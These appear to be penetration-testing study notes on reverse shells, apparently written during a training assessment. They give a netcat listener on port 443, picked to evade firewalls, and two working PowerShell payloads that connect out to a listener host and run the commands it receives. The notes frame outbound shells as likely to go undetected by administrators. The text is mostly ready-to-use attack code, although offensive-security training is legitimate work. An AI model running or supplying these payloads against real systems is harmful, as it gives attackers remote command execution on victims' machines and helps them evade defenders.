> Often overlooked by the admins since it uses outbound connections.
> Better chance of being undetected.

- [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)Â is one fantastic resource that contains a list of different commands, code, and even automated reverse shell generators we can use when practicing or on an actual engagement.

#### Server
```
nc -nvlp 443

#using the port 443 which is usually for HTTPS connections to avoid firewalls.
```

#### Client (windows target)

```cmd-session
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('172.16.1.5',443);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### This is what worked in the assesment lol

```
$client = New-Object System.Net.Sockets.TCPClient('10.10.16.76',443);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){
    $data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);
    if (![string]::IsNullOrWhiteSpace($data)) {
        try {
            $sendback = (iex $data 2>&1 | Out-String)
        } catch {
            $sendback = $_.Exception.Message
        }
    } else {
        $sendback = "Empty command received.`n"
    }
    $sendback2 = $sendback + 'PS ' + (pwd).Path + '>';
    $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
    $stream.Write($sendbyte,0,$sendbyte.Length);
    $stream.Flush()
}
$client.Close()   
```

